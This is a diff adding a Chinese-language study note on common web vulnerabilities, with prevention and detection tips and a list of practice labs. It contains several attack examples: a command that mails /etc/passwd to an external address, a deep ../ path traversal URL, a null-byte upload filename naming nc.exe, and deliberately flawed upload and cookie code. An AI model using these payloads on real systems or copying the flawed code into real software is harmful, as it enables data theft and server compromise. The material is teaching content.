+- [x] 其中CVE-2021-3711 的问题来自SM2 解密缓冲区溢出，该漏洞存在于OpenSSL 1.1.1 系列中1.1.1k 及之前的版本，在8月12日由John Ouyang 报告，现在已经由Matt Caswell 修复，OpenSSL 维护者建议使用OpenSSL 1.1.1 系列的用户尽快升级到1.1.1l (注意l是字母L的小写形式)版本
+
+### 文件上传漏洞
+
+- [x] 由于对用户上传的 `文件类型判断不完善` ，导致攻击者上传非法类型的文件，从而对网站进行攻击
+
+<p align="center">
+  <img src="./img/文件上传漏洞.png"></img>
+  <img src="./img/文件上传漏洞1.png"></img>
+</p>
+
+- [x] 利用当前系统已有的上传功能，比如文件上传，图像上传等的漏洞来<span style="color:red;">上传任意文件或者webshell</span>
+- [x] 危害：直接上传webshell到服务器，甚至获取服务器root权限
+- [x] 各种语言表现大同小异
+
+<!-- tabs:start -->
+
+#### **Asp上传漏洞表现**
+
+- [x] 经典的“\0”上传任意后缀文件
+  - 假设：filename="c:\nc.exe .bmp"
+    ```asp
+    'Check the file extension
+    if right(tFile,4) <> ".bmp" then exit sub tFile=tFile &".bmp"
+    Set FSO = erver.CreateObject("Scripting.FileSystemObject")
+    Set FSOFile=FSO.CreateTextFile(FSO.BuildPath(Path, tFile))
+    ```
+
+<p align="center">
+  <img src="./img/Asp上传漏洞表现.png"></img>
+</p>
+
+- [x] Asp上传漏洞预防/检测
+  - 检查文件名是否包含'\0'字符。
+  - 采用白名单方式允许上传文件类型。
+  - 检测关键字：
+    `Scripting.FileSystemObject/ADODB.Stream`
+
+#### **Php上传漏洞表现**
+
+```php
+$imageinfo = getimagesize($_FILES['userfile']['tmp_name']);
+ if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 
+'image/jpeg') {
+ if($_FILES['userfile']['type'] != "image/gif") {   
+echo “仅允许上传GIF和JPEG图片\n"; exit;
+ }
+ $uploaddir = 'uploads/';
+ $uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
+ if (move_uploaded_file($_FILES['userfile']['tmp_name'],
+ $uploadfile)) {
+ echo “文件上传成功.\n";
+ } else {
+ echo “上传失败.\n";
+ }
+```
+
+- [x] Php上传漏洞预防/检测
+  - 检查上传文件名中 `是否存在.php字符` 。
+  - 采用白名单，仅允许安全的类型，如gif/jpg/rar等，禁止用户自定义文件后缀。
+  - 检测关键字：
+    `move_uploaded_file/is_uploaded_file/copy`
+
+#### **Jsp上传漏洞表现**
+
+- [x] 后缀检查不严引起的上传任意文件，主要为jsp和war后缀文件。
+- [x] 采用白名单严格限制上传类型。
+- [x] 检测方法：
+  - ——File/SmartUpload(常用的一个jsp开源上传组件)
+  - ——至/WEB-INF/lib/目录下查看相关upload字样的类库，作为关键字搜索。
+
+#### **asp.net上传漏洞表现**
+
+- [x] Asp.net自身提供有上传组件，但默认上传任意后缀文件。
+- [x] IIS默认解析的后缀名都是不安全的，采用白名单方式上传文件。
+- [x] 检查关键字：
+  `PostedFile.FileName/FileUpload`
+
+<!-- tabs:end -->
+
+### 远程命令执行(code execution)
+
+- [x] 通过用户浏览器客户端传送一个命令串给Web server，<span style="color:blue;">web server通过调用shell来执行传过来的命令</span>
+
+- [x] 如果我通过浏览器客户端强行传送一个：restart, shutdown之类的命令给server，结果会是什么样子？结果只是破坏
+- [x] 如果传送一个：<span style="color:blue;">mail abc@xxx.com < /etc/passwd</span>，执行结果是什么？结果是将linux系统的passwd文件(linux系统用户信息)发送到指定的邮箱abc@xxx.com
+
+#### 远程命令执行漏洞防范
+
+- **严格限制运行Web服务的用户权限** 。就是说你的Web应用可以访问你的服务器系统的用户权限。一般情况一下，我们应该以白名单的形式介定Web应用可以访问服务器系统的权限。这样控制可以从系统级达到安全防范的效果
+- **严格执行用户输入的合法性检查** 。注意这里的输入不一定是你通过表单从键盘输入，往往是Web应用已经内定了某一些操作供您选择，而此时你可以通过Http抓包的方式获取Http请求信息包经改装后重新发送
+
+### 目录遍历(Directory traversal)
+
+- [x] 例如：abc.xxx.net上有网络硬盘服务，当注册用户登录并开通网络硬盘服务后，即可进入自己的硬盘管理界面，我们来看看它是如何进入某一个目录的，以下是进入某一目录的URL：
+  - http://abc.xxx.net/Personal_Spaces_List.php?dir=MyFolder
+- [x] 那现在把这个URL改装一下：
+  - http://abc.xxx.net/Personal_Spaces_List.php?dir=../../../../../../../../../../../../../usr/local/apache/conf/
+  - 在浏览器里运行它，会是什么结果呢？
+- [x] 结果是：/usr/local/apache/conf/里的所有文件都老老实实的列出来了，通过这种方式，你可以发挥你的想象了，服务器上的东西是不是都差不多可以列出来了？告诉你，还可以随便下载呢！
+- [x] 简要的解决方案:
+  - 限制Web应用在服务器上的运行
+  - 进行严格的输入验证， <span style="color:blue;">控制用户输入非法路径</span>
+
+### Cookie欺骗攻击
+
+- [x] Cookie：Web服务器存放在客户端计算机的一些信息，主要用来客户端识别或身份识别等。Session,保存在服务器端的
+- [x] Cookie欺骗攻击：攻击者 <span style="color:blue;">通过修改存放在客户端的cookie来达到欺骗服务器认证目的</span>
+- [x] 修改工具：IECookiesView 
+
+#### Cookie攻击原理
+
+```sql
+If(“登录验证过程”){
+  setcookie("isadmin”,1,time()+3600*24*30);
+}//登录成功，写入cookie，一个月后失效，用于下次登录。
+……
+$admin= $_COOKIE[“isadmin"]; 
+if($admin){
+  echo “已经登录”;
+}else{ echo “请重新登陆”;}
+//没对cookie有效性进行验证，导致cookie欺骗产生。
+```
+
+#### Cookie欺骗预防
+
+- [x] 禁用cookie，采用session。一般适合web系统安全性要求比较高的情况下——后台管理等。
+- [x] 增加多参数验证cookie有效性。——如验证访问者ip是否与上次IP一样等。
+
+#### Cookie欺骗检测
+
+- 关键字检测
+  - Asp:Response.Cookies/Request.Cookies
+  - Php:Setcookie/$_COOKIE/$HTTP_COOKIE_VARS
+  - Jsp:response.addCookie /request.getCookies
+  - Asp.net:response.Cookies/request.Cookies 
+
+### Php 文件包含漏洞
+
+- Php：include/require/include_once/require_once函数使用时参数没有限制导致可以包含远程文件或者本地文件。
+- Php4存在远程&本地，php5仅存在本地包含。
+- 检测：include/require/include_once/require_once
+- 其他语言表现。 
+
+### 其他漏洞检测
+
+- 信息泄露
+- 权限验证不严
+- 仅仅罗列了一些常见的漏洞情况，实际上检测难度将比这个代码复杂的多了，这就要求我们对程序有足够的了解。
+
+### Web漏洞测试平台
+
+- DVWA(Damn Vulnerable Web Application) https://www.vulnspy.com/dvwa/
+  - DVWA是一套用PHP+MySQL编写的用于Web漏洞教学和演练的开源免费工具。著名的渗透测试平台Kali Linux中已经集成了该工具
+  - DVWA目前的版本共有10个漏洞模块，分别是：
+    - Brute Force(暴力破解)
+    - CSRF(跨站请求伪造)
+    - File Inclusion(文件包含)
+    - File Upload(文件上传)
+    - SQL Injection(SQL注入)
+    - Insecure CAPTCHA(不安全的验证码)
+    - XSS (Reflected)(反射型跨站脚本)
+    - XSS (Stored)(存储型跨站脚本)
+    - Command Injection(命令行注入)
+    - SQL Injection (Blind)(SQL盲注)
+- WebGoat 是由著名的OWASP负责维护的一个漏洞百出的J2EE Web应用程序，这些漏洞并非程序中的bug，而是故意设计用来讲授Web应用程序安全课程的。这个应用程序提供了一个逼真的教学环境，为用户完成课程提供了有关的线索。https://owasp.org/www-project-webgoat/
+- Sqli Lab ​  支持报错注入、二次注入、盲注、Update注入、Insert注入、Http头部注入、二次注入练习等。支持GET和POST两种方式。https://github.com/Audi-1/sqli-labs
+- Mutillidae 是一个免费、开源的Web应用程序，提供专门被允许的安全测试和入侵的Web应用程序。其中包含了丰富的渗透测试项目，如SQL注入、跨站脚本、clickjacking、本地文件包含、远程代码执行等。https://github.com/webpwnized/mutillidae
+
+### SQL注入漏洞扫描工具
+
+- [x] SQLMAP被称为“SQL注入第一神器”，开放源代码，可以 **自动探测和利用SQL注入漏洞及接管数据库服务器**
+- [x] 其主要功能是 `扫描、发现并利用` 给定的URL和SQL注入漏洞，其广泛的功能和选项包括数据库指纹、枚举、数据库提权、访问目标文件系统，并在获取操作权限时执行任意命令
